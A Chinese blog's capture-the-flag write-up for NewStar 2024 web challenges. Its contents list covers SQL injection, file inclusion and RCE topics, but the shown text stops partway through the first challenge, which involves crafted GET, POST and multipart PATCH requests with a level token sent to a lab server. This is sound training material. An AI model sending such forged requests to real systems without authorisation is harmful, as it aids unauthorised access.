@@ -1,0 +1,2025 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" week1 PangBai 过家家（1） 考点：通过token跳转页面，PATCH传参（需要注意传参方法,Content-Type） 第一关，说头部有东西\n抓包发现请求头没东西，发包看看响应头，有一个路由\n访问进入第二关，这个提示应该是要我们get传个参\n刚刚get传了，这里显然就是post传参\n">
+<title>2024newstar-web</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/2024newstar-web/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="2024newstar-web">
+<meta property='og:description' content=" week1 PangBai 过家家（1） 考点：通过token跳转页面，PATCH传参（需要注意传参方法,Content-Type） 第一关，说头部有东西\n抓包发现请求头没东西，发包看看响应头，有一个路由\n访问进入第二关，这个提示应该是要我们get传个参\n刚刚get传了，这里显然就是post传参\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/2024newstar-web/'>
+<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-05-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-05-18T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="2024newstar-web">
+<meta name="twitter:description" content=" week1 PangBai 过家家（1） 考点：通过token跳转页面，PATCH传参（需要注意传参方法,Content-Type） 第一关，说头部有东西\n抓包发现请求头没东西，发包看看响应头，有一个路由\n访问进入第二关，这个提示应该是要我们get传个参\n刚刚get传了，这里显然就是post传参\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#pangbai-过家家1"><strong>PangBai 过家家（1）</strong></a>
+      <ol>
+        <li><a href="#考点通过token跳转页面patch传参需要注意传参方法content-type">考点：通过token跳转页面，PATCH传参（需要注意传参方法,Content-Type）</a></li>
+      </ol>
+    </li>
+    <li><a href="#headach3"><strong>headach3</strong></a></li>
+    <li><a href="#会赢吗">会赢吗</a></li>
+    <li><a href="#智械危机"><strong>智械危机</strong></a></li>
+    <li><a href="#谢谢皮蛋"><strong>谢谢皮蛋</strong></a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#pangbai-过家家2"><strong>PangBai 过家家（2）</strong></a></li>
+    <li><a href="#你能在一秒内打出八句英文吗"><strong>你能在一秒内打出八句英文吗</strong></a></li>
+    <li><a href="#复读机"><strong>复读机</strong></a></li>
+    <li><a href="#谢谢皮蛋-plus"><strong>谢谢皮蛋 plus</strong></a>
+      <ol>
+        <li><a href="#过滤空格的报错注入联合注入">过滤空格的报错注入(联合注入)</a></li>
+      </ol>
+    </li>
+    <li><a href="#遗失的拉链"><strong>遗失的拉链</strong></a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#include-me"><strong>Include Me</strong></a></li>
+    <li><a href="#臭皮的计算机"><strong>臭皮的计算机</strong></a>
+      <ol>
+        <li><a href="#python代码转8进制执行rce">python代码转8进制执行rce</a></li>
+      </ol>
+    </li>
+    <li><a href="#blindsql1"><strong>blindsql1</strong></a>
+      <ol>
+        <li><a href="#布尔盲注过滤空格substr">布尔盲注（过滤=，空格，/，substr）</a></li>
+      </ol>
+    </li>
+    <li><a href="#这照片是你吗"><strong>这「照片」是你吗</strong></a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/write.up/" style="background-color: #2a9d8f; color: #fff;">
+                write.up
+            </a>
+        
+            <a href="/categories/web/" style="background-color: #ff0000; color: #fff;">
+                web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2024newstar-web/">2024newstar-web</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-05-18</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 12 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<hr>
+<h1 id="week1">week1
+</h1><h2 id="pangbai-过家家1"><strong>PangBai 过家家（1）</strong>
+</h2><h3 id="考点通过token跳转页面patch传参需要注意传参方法content-type">考点：通过token跳转页面，PATCH传参（需要注意传参方法,Content-Type）
+</h3><p>第一关，说头部有东西</p>
+<img src="image-20250518100925050.png" alt="image-20250518100925050" style="zoom:33%;" />
+<p>抓包发现请求头没东西，发包看看响应头，有一个路由</p>
+<img src="image-20250518100908374.png" alt="image-20250518100908374" style="zoom:50%;" />
+<p>访问进入第二关，这个提示应该是要我们get传个参</p>
+<img src="image-20250518101117321.png" alt="image-20250518101117321" style="zoom:33%;" />
+<p>刚刚get传了，这里显然就是post传参</p>
+<img src="image-20250518103025412.png" alt="image-20250518103025412" style="zoom: 33%;" />
+<p>进入第4关，显然是改UA（题目的要求比较严格，<code>User-Agent</code> 必须按照标准格式填写，所以只将 Mozilla 替换为 Papa ）</p>
+<img src="image-20250518104044243.png" alt="image-20250518104044243" style="zoom:33%;" />
+<p>然后这里将say=玛卡巴卡阿卡哇卡米卡玛卡呣，但是bp里要url编码再传</p>
+<img src="image-20250518104653501.png" alt="image-20250518104653501" style="zoom:50%;" />
+<p>然后将响应token复制过来到第五关</p>
+<img src="image-20250518104740693.png" alt="image-20250518104740693" style="zoom:33%;" />
+<p>这个其实就是要上传一个文件，且文件名是*.zip,可以先构造文件上传，然后抓包将PATCH 包内容复制</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="n">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">POST数据包POC</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s2">&#34;http://192.168.1.117:61122/&#34;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&#34;post&#34;</span> <span class="n">enctype</span><span class="o">=</span><span class="s2">&#34;multipart/form-data&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="err">!</span><span class="o">--</span><span class="n">链接是当前打开的题目链接</span><span class="o">--&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">label</span> <span class="k">for</span><span class="o">=</span><span class="s2">&#34;file&#34;</span><span class="o">&gt;</span><span class="n">文件名</span><span class="err">：</span><span class="o">&lt;/</span><span class="n">label</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&#34;file&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;file&#34;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&#34;file&#34;</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;value&#34;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&#34;token&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250518115312839.png" alt="image-20250518115312839" style="zoom:50%;" />
+<p>先将文件名改成*.zip，发现没有post参数say，所以将submit=提交，改为say=玛卡巴卡阿卡哇卡米卡玛卡呣</p>
+<p>然后复制下面内容，得到第6关token</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryYudMt2yQ4c24igjC</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;*.zip&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="nb">zip</span><span class="o">-</span><span class="n">compressed</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryYudMt2yQ4c24igjC</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;say&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">玛卡巴卡阿卡哇卡米卡玛卡呣</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryYudMt2yQ4c24igjC</span><span class="o">--</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">这里也要改Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundaryYudMt2yQ4c24igjC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#PATCH 包的格式与 POST 无异，使用 Content-Type: multipart/form-data 发包即可，注意该 Header 的值后面需要加一个 boundary 表示界定符。例如Content-Type: multipart/form-data; boundary=abc，那么在 Body 中，以 --abc 表示一个查询字段的开始，当所有查询字段结束后，用 --abc-- 表示结束。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">然后还要改传参方法为PATCH</span><span class="err">！！！</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果复制中文乱码看下文</p>
+<p>[<a class="link" href="https://blog.csdn.net/m0_38076341/article/details/108104230?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=108104230&amp;sharerefer=PC&amp;sharesource=2301_80915592&amp;sharefrom=from_link"  target="_blank" rel="noopener"
+    >已解决]burpsuite无法输入中文_burpsuite输入中文-CSDN博客</a></p>
+<img src="image-20250518134857314.png" alt="image-20250518134857314" style="zoom:50%;" />
+<p>当然看了wp手动构造显然更加简单</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">PATCH</span> <span class="o">/</span><span class="err">?</span><span class="n">ask</span><span class="o">=</span><span class="n">miao</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">192.168.1.117</span><span class="p">:</span><span class="mi">61122</span>
+</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Papa</span><span class="o">/</span><span class="mf">1.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=</span><span class="n">abc</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="p">:</span> <span class="n">token</span><span class="o">=</span><span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="o">.</span><span class="n">eyJsZXZlbCI6NX0</span><span class="o">.</span><span class="n">PTZOvQ7</span><span class="o">-</span><span class="n">WBrk_do</span><span class="o">-</span><span class="n">Z8kZIArxWK</span><span class="o">-</span><span class="n">q1EG2FpH1egSioAI</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">168</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="n">abc</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;1.zip&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">123</span>
+</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="n">abc</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;say&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">玛卡巴卡阿卡哇卡米卡玛卡呣</span>
+</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="n">abc</span><span class="o">--</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250518135450695.png" alt="image-20250518135450695" style="zoom:50%;" />
+<p>也可以python一把梭</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
